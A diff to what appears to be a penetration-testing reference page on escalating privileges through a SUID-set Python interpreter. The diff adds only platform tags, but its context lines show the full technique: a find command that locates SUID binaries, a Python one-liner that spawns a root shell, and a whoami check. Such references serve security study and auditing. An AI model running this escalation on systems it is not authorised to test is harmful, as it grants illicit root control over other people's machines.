@@ -11,6 +11,7 @@ If the Python interpreter has the SUID bit set, any script or command executed t
 
 ## Discovery
 
+<!-- cmd: linux -->
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 # /usr/bin/python2.7
@@ -20,6 +21,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 Use Python's `os` module to spawn a shell. Since the process already has an effective UID of 0, `execl` or `system` will spawn a shell retaining those privileges.
 
+<!-- cmd: linux -->
 ```bash
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
@@ -28,6 +30,7 @@ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 
 ### Verification
 
+<!-- cmd: linux -->
 ```bash
 whoami
 # root
